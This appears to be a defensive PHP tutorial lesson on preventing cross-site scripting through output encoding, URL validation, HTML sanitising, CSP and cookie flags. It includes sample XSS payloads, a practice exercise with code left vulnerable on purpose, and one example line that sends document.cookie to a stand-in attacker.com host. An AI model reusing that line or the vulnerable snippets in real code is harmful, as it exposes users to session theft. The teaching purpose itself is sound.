# Lesson 04 - Preventing XSS: Building Secure Applications

**Duration**: 60 minutes

---

## Introduction: The Solution is Simpler Than You Think

Good news: **Preventing XSS is actually straightforward** if you follow one golden rule:

> **Never trust user input. Always encode output.**

That's it. The hard part isn't the technique - it's remembering to do it **everywhere, every time**.

---

## The Golden Rule: Context-Aware Output Encoding

Different contexts require different encoding:

```php
// HTML context
<p><?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?></p>

// HTML attribute context
<input value="<?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?>">

// URL context
<a href="search.php?q=<?= urlencode($user_input) ?>">Search</a>

// JavaScript context
<script>
var name = <?= json_encode($user_input, JSON_HEX_TAG | JSON_HEX_AMP) ?>;
</script>

// CSS context (avoid if possible, but if you must)
<style>
/* Only allow whitelisted, validated values */
</style>
```

Let's dive into each context in detail.

---

## 1. HTML Context Protection

### The Solution: htmlspecialchars()

This is your primary weapon against XSS:

```php
<?php
function safe($value) {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
?>

<h1><?= safe($title) ?></h1>
<p><?= safe($description) ?></p>
<div><?= safe($comment) ?></div>
```

### What htmlspecialchars() Does

It converts special characters to HTML entities:

```php
$input = '<script>alert("XSS")</script>';
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// Browser displays: <script>alert("XSS")</script>
// But doesn't execute it!
```

**Conversions**:
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;` (when using ENT_QUOTES)
- `&` → `&amp;`

### Always Use These Parameters

```php
htmlspecialchars($value, ENT_QUOTES, 'UTF-8')
```

- **ENT_QUOTES**: Encode both double and single quotes
- **'UTF-8'**: Handle international characters correctly

**Why ENT_QUOTES is critical**:

```php
// WITHOUT ENT_QUOTES - VULNERABLE!
<input value="<?= htmlspecialchars($username) ?>">

// Attacker sets username to: " onmouseover="alert('XSS')
// Output: <input value="" onmouseover="alert('XSS')">
// Attack succeeds!

// WITH ENT_QUOTES - SAFE
<input value="<?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>">
// Output: <input value="&quot; onmouseover=&quot;alert('XSS')">
// Attack fails!
```

### Create a Helper Function

```php
<?php
// helpers.php

/**
 * Escape HTML entities
 */
function e($value) {
    if ($value === null) {
        return '';
    }

    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

/**
 * Escape and allow specific HTML tags
 */
function e_html($value, $allowedTags = '<b><i><u><a><br><p>') {
    if ($value === null) {
        return '';
    }

    // First strip all tags except allowed
    $value = strip_tags($value, $allowedTags);

    // Then ensure allowed tags have safe attributes
    // (More on this in advanced section)

    return $value;
}
```

**Usage**:
```php
<h1><?= e($title) ?></h1>
<p><?= e($description) ?></p>

<!-- If you need to allow some formatting -->
<div class="article-content">
    <?= e_html($article_body, '<p><br><b><i><strong><em>') ?>
</div>
```

---

## 2. HTML Attribute Context Protection

### Same as HTML Content

Use `htmlspecialchars()` with `ENT_QUOTES`:

```php
<input type="text" value="<?= e($username) ?>">
<img src="avatar.jpg" alt="<?= e($alt_text) ?>">
<a href="profile.php" title="<?= e($title) ?>">Profile</a>
```

### URL Attributes Need Extra Care

```php
// For href attributes with user input
<a href="<?= e($user_url) ?>">Link</a>

// But ALSO validate that it's a safe protocol
<?php
$url = $_GET['url'];

// Only allow http and https
$parsed = parse_url($url);
if (!in_array($parsed['scheme'] ?? '', ['http', 'https'])) {
    $url = '#'; // Safe fallback
}
?>
<a href="<?= e($url) ?>">Link</a>
```

**Why protocol validation matters**:

```php
// DANGEROUS - No protocol validation
<a href="<?= e($user_url) ?>">Click</a>

// Attacker sets: javascript:alert('XSS')
// Output: <a href="javascript:alert('XSS')">Click</a>
// When clicked, JavaScript executes!

// SAFE - With protocol validation
<?php
function safe_url($url) {
    $parsed = parse_url($url);
    $scheme = $parsed['scheme'] ?? '';

    if (!in_array($scheme, ['http', 'https'])) {
        return '#'; // or show error
    }

    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}
?>
<a href="<?= safe_url($user_url) ?>">Click</a>
```

---

## 3. URL Parameter Context Protection

### The Solution: urlencode()

When adding user input to URLs:

```php
<?php
$searchQuery = $_POST['search'];
$category = $_POST['category'];
?>

<a href="search.php?q=<?= urlencode($searchQuery) ?>&category=<?= urlencode($category) ?>">
    Search
</a>
```

**What urlencode() does**:
- Spaces become `%20`
- Special characters become `%XX` (hex encoding)
- Prevents breaking out of URL context

```php
$query = 'php & mysql';
echo urlencode($query);
// Output: php+%26+mysql

$malicious = '<script>alert("XSS")</script>';
echo urlencode($malicious);
// Output: %3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
// Browser won't execute this!
```

### Complete URL Example

```php
<?php
$base = "https://example.com/search.php";
$params = [
    'q' => $_GET['q'],
    'category' => $_GET['category'],
    'sort' => $_GET['sort']
];

$queryString = http_build_query($params);
$fullUrl = $base . '?' . $queryString;
?>

<a href="<?= e($fullUrl) ?>">Search</a>

<!-- http_build_query handles URL encoding automatically -->
```

---

## 4. JavaScript Context Protection

### The Solution: json_encode() with Security Flags

**NEVER concatenate user input into JavaScript**:

```php
<!-- WRONG - DANGEROUS! -->
<script>
var username = "<?= $username ?>";
// Attacker sets username to: "; alert('XSS'); //
// Result: var username = ""; alert('XSS'); //";
// Attack succeeds!
</script>
```

**Use json_encode() instead**:

```php
<!-- RIGHT - SAFE -->
<script>
var username = <?= json_encode($username, JSON_HEX_TAG | JSON_HEX_AMP) ?>;
var user = <?= json_encode($user_object, JSON_HEX_TAG | JSON_HEX_AMP) ?>;
</script>
```

**Why the flags are important**:

```php
// Without flags
$data = "</script><script>alert('XSS')</script>";
echo json_encode($data);
// Output: "</script><script>alert('XSS')</script>"
// Browser sees </script> and closes the script tag early!
// Second script executes!

// With flags
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);
// Output: "\u003C\/script\u003E\u003Cscript\u003Ealert('XSS')\u003C\/script\u003E"
// Safe! Characters are escaped.
```

**Flags explained**:
- `JSON_HEX_TAG`: Encode < and > as \uXXXX
- `JSON_HEX_AMP`: Encode & as \u0026
- `JSON_HEX_QUOT`: Encode " as \u0022
- `JSON_HEX_APOS`: Encode ' as \u0027

**Best practice**: Use all four:

```php
const JSON_SAFE = JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_QUOT | JSON_HEX_APOS;

<script>
var data = <?= json_encode($user_data, JSON_SAFE) ?>;
</script>
```

### JavaScript Event Handlers

**Avoid inline event handlers with user input**:

```php
<!-- DANGEROUS - Don't do this -->
<button onclick="handleClick('<?= $user_input ?>')">Click</button>

<!-- SAFE - Use data attributes and addEventListener -->
<button id="myBtn" data-value="<?= e($user_input) ?>">Click</button>

<script>
document.getElementById('myBtn').addEventListener('click', function() {
    var value = this.getAttribute('data-value');
    handleClick(value);
});
</script>
```

---

## 5. CSS Context Protection

### Best Practice: Avoid User Input in CSS

CSS is complex and has many XSS vectors. Avoid it if possible.

**If you must allow user customization**:

```php
<?php
// Only allow whitelisted values
$allowedColors = ['red', 'blue', 'green', 'black', 'white'];
$userColor = $_POST['color'];

if (!in_array($userColor, $allowedColors)) {
    $userColor = 'black'; // safe default
}

// Or validate hex color format
if (!preg_match('/^#[0-9A-F]{6}$/i', $userColor)) {
    $userColor = '#000000';
}
?>

<style>
.user-theme {
    color: <?= $userColor ?>; /* Safe because validated */
}
</style>
```

**NEVER do this**:

```php
<!-- VULNERABLE -->
<style>
.custom {
    <?= $_POST['css'] ?>; /* User can inject anything! */
}
</style>
```

---

## 6. Rich Text / HTML Content

### The Challenge

Sometimes users need to format text (blog posts, comments with formatting, etc.). You can't just strip all HTML.

### Solution 1: Markdown (Recommended)

Convert Markdown to HTML using a library:

```php
<?php
// Use a library like Parsedown
require 'Parsedown.php';

$markdown = $_POST['content'];
$parsedown = new Parsedown();

// Parsedown escapes HTML by default
$safeHtml = $parsedown->text($markdown);

echo $safeHtml;
```

**User writes**:
```
# My Title

This is **bold** and this is *italic*.

[Link](https://example.com)
```

**Output is safe HTML**:
```html
<h1>My Title</h1>
<p>This is <strong>bold</strong> and this is <em>italic</em>.</p>
<p><a href="https://example.com">Link</a></p>
```

### Solution 2: HTML Purifier

If you must allow HTML, use HTML Purifier library:

```php
<?php
require 'HTMLPurifier.auto.php';

$config = HTMLPurifier_Config::createDefault();

// Only allow safe tags
$config->set('HTML.Allowed', 'p,b,i,u,a[href],br,strong,em');

// Only allow http/https in links
$config->set('URI.AllowedSchemes', ['http' => true, 'https' => true]);

$purifier = new HTMLPurifier($config);
$cleanHtml = $purifier->purify($_POST['content']);

echo $cleanHtml;
```

**Never use strip_tags() alone**:

```php
// VULNERABLE - Doesn't handle attributes!
$html = strip_tags($input, '<a><b><i>');

// Attacker input: <a href="javascript:alert('XSS')">Click</a>
// Output: <a href="javascript:alert('XSS')">Click</a>
// Still vulnerable!
```

### Solution 3: WYSIWYG with Sanitization

If using a WYSIWYG editor (TinyMCE, CKEditor):

1. Configure the editor to only allow safe elements
2. Still sanitize server-side (never trust client-side)
3. Use HTML Purifier or similar

```php
<?php
// Example with TinyMCE output
$editorContent = $_POST['content'];

// Configure purifier
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,b,i,u,a[href],br,strong,em,ul,ol,li,h1,h2,h3');
$config->set('URI.AllowedSchemes', ['http' => true, 'https' => true]);

$purifier = new HTMLPurifier($config);
$cleanContent = $purifier->purify($editorContent);

// Store in database
$db->query("INSERT INTO posts (content) VALUES (?)", [$cleanContent]);
```

---

## 7. Content Security Policy (CSP)

CSP is a powerful security layer that tells browsers what's allowed to execute.

### Basic CSP Header

```php
<?php
// Set CSP header
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';");
?>
```

### What CSP Does

**Blocks inline scripts**:
```html
<!-- This won't execute with CSP enabled -->
<script>alert('XSS')</script>
```

**Only allows scripts from whitelisted sources**:
```
script-src 'self' https://cdn.example.com;
```

**Blocks eval()** and other dangerous JavaScript:
```javascript
// This won't work with CSP
eval('alert("XSS")');
```

### CSP Directives

```php
header("Content-Security-Policy: " .
    "default-src 'self'; " .           // Default policy: only same origin
    "script-src 'self' 'nonce-abc123'; " . // Scripts from self + nonce
    "style-src 'self' 'unsafe-inline'; " . // Styles from self + inline
    "img-src 'self' https:; " .        // Images from self + https sites
    "font-src 'self'; " .              // Fonts from self only
    "connect-src 'self'; " .           // AJAX to self only
    "frame-ancestors 'none'; " .       // No iframing
    "base-uri 'self'; " .              // Prevent base tag injection
    "form-action 'self';"              // Forms submit to self only
);
```

### CSP with Nonce (Recommended)

Allows specific inline scripts while blocking others:

```php
<?php
// Generate unique nonce
$nonce = base64_encode(random_bytes(16));

// Set CSP with nonce
header("Content-Security-Policy: script-src 'self' 'nonce-$nonce'; object-src 'none';");
?>

<!DOCTYPE html>
<html>
<head>
    <!-- This script has the nonce, so it's allowed -->
    <script nonce="<?= $nonce ?>">
        console.log('This executes');
    </script>

    <!-- This would be allowed -->
    <script src="/js/app.js"></script>

    <!-- This would be BLOCKED (no nonce) -->
    <script>alert('XSS')</script>
</head>
</html>
```

### CSP Report-Only Mode

Test CSP without breaking your site:

```php
<?php
// Report violations but don't block
header("Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report");
```

When violations occur, browser sends reports to `/csp-report` endpoint.

---

## 8. Additional XSS Prevention Techniques

### X-XSS-Protection Header

```php
<?php
// Enable browser's XSS filter
header("X-XSS-Protection: 1; mode=block");
```

**Note**: This is deprecated in modern browsers because CSP is better, but doesn't hurt to include for older browsers.

### X-Content-Type-Options

```php
<?php
// Prevent MIME type sniffing
header("X-Content-Type-Options: nosniff");
```

Prevents browsers from executing files as a different content type than declared.

### Strict-Transport-Security (HSTS)

```php
<?php
// Force HTTPS (once visited via HTTPS)
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
```

### HttpOnly Cookies

```php
<?php
// Prevent JavaScript from accessing cookies
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,   // Only send over HTTPS
    'httponly' => true, // Not accessible via JavaScript
    'samesite' => 'Strict'
]);

session_start();
```

**Why this matters**:
```javascript
// With HttpOnly: this is empty/undefined
console.log(document.cookie);

// Without HttpOnly: attacker can steal
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

---

## Complete XSS-Safe Example

```php
<?php
// config.php
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();

// Security headers
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https:;");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Helper function
function e($value) {
    return htmlspecialchars($value ?? '', ENT_QUOTES, 'UTF-8');
}

// Database (using PDO with prepared statements)
$pdo = new PDO('mysql:host=localhost;dbname=myapp', 'user', 'pass');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```

```php
<?php
// comment-system.php
require 'config.php';

// Handle comment submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'] ?? '';
    $comment = $_POST['comment'] ?? '';

    // Validate
    if (strlen($name) < 2 || strlen($name) > 50) {
        $error = 'Name must be 2-50 characters';
    } elseif (strlen($comment) < 5 || strlen($comment) > 500) {
        $error = 'Comment must be 5-500 characters';
    } else {
        // Store raw data (no encoding)
        $stmt = $pdo->prepare("INSERT INTO comments (name, comment) VALUES (?, ?)");
        $stmt->execute([$name, $comment]);

        $success = 'Comment posted!';
    }
}

// Fetch comments
$stmt = $pdo->query("SELECT * FROM comments ORDER BY id DESC LIMIT 50");
$comments = $stmt->fetchAll();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS-Safe Comments</title>
</head>
<body>
    <h1>Comment System (XSS-Safe)</h1>

    <?php if (isset($error)): ?>
        <p style="color:red;"><?= e($error) ?></p>
    <?php endif; ?>

    <?php if (isset($success)): ?>
        <p style="color:green;"><?= e($success) ?></p>
    <?php endif; ?>

    <form method="POST">
        <input type="text"
               name="name"
               placeholder="Your name"
               value="<?= e($_POST['name'] ?? '') ?>"
               required>
        <br>

        <textarea name="comment"
                  placeholder="Your comment"
                  required><?= e($_POST['comment'] ?? '') ?></textarea>
        <br>

        <button type="submit">Post Comment</button>
    </form>

    <h2>Comments</h2>

    <?php foreach ($comments as $comment): ?>
        <div style="border:1px solid #ccc; padding:10px; margin:10px 0;">
            <strong><?= e($comment['name']) ?></strong>
            <p><?= e($comment['comment']) ?></p>
        </div>
    <?php endforeach; ?>

    <script>
        // If you need user data in JavaScript
        const userName = <?= json_encode($_SESSION['username'] ?? 'Guest', JSON_HEX_TAG | JSON_HEX_AMP) ?>;
        console.log('Logged in as:', userName);
    </script>
</body>
</html>
```

---

## XSS Prevention Checklist

For every page/feature, verify:

### Output Encoding
- [ ] All user input is encoded with `htmlspecialchars()` when displaying in HTML
- [ ] Using `ENT_QUOTES` and `'UTF-8'` parameters
- [ ] URL parameters use `urlencode()`
- [ ] JavaScript data uses `json_encode()` with security flags
- [ ] No inline event handlers with user input

### Input Validation
- [ ] All input is validated (type, length, format)
- [ ] URL protocols are validated (only http/https)
- [ ] File uploads are validated (type, size, content)

### Security Headers
- [ ] Content-Security-Policy is set
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY or SAMEORIGIN
- [ ] Cookies have HttpOnly and Secure flags

### Database
- [ ] All queries use prepared statements
- [ ] No string concatenation in SQL

### Rich Content
- [ ] Using Markdown or HTML Purifier for formatted text
- [ ] Not relying on `strip_tags()` alone
- [ ] Server-side sanitization (not just client-side)

---

## Key Takeaways

1. **Always encode output** - Use `htmlspecialchars()` everywhere
2. **Context matters** - HTML, URL, JavaScript, CSS all need different encoding
3. **Use ENT_QUOTES and UTF-8** - Essential for complete protection
4. **Never concatenate into JavaScript** - Use `json_encode()` with flags
5. **Validate URL protocols** - Only allow http/https
6. **Use CSP** - Adds powerful layer of defense
7. **HttpOnly cookies** - Prevents cookie theft
8. **Store raw, encode on output** - Prevents double encoding
9. **Use libraries for rich content** - Markdown, HTML Purifier
10. **Never trust input** - Even from your own database

---

## Practice Exercise

Fix this vulnerable code:

```php
<?php
// VULNERABLE CODE - FIX ALL XSS ISSUES

$users = $pdo->query("SELECT * FROM users")->fetchAll();
?>

<h1>User Directory</h1>

<form method="GET">
    <input type="text" name="search" value="<?= $_GET['search'] ?>">
    <button>Search</button>
</form>

<?php if (isset($_GET['search'])): ?>
    <p>Results for: <?= $_GET['search'] ?></p>
<?php endif; ?>

<?php foreach ($users as $user): ?>
    <div class="user-card">
        <h2><?= $user['name'] ?></h2>
        <p>Bio: <?= $user['bio'] ?></p>
        <a href="<?= $user['website'] ?>">Website</a>
    </div>
<?php endforeach; ?>

<script>
var searchTerm = "<?= $_GET['search'] ?? '' ?>";
</script>
```

**Tasks**:
1. Identify all XSS vulnerabilities
2. Fix each one with proper encoding
3. Add validation for the website URL
4. Fix the JavaScript injection
5. Add CSP header

---

## What's Next?

XSS is just one of many attacks. In the next lesson, we'll learn about **CSRF (Cross-Site Request Forgery)** - another critical vulnerability that allows attackers to perform actions on behalf of users.

You'll learn:
- How CSRF attacks work
- Real-world CSRF examples
- Why your login system isn't enough
- How to build CSRF protection from scratch
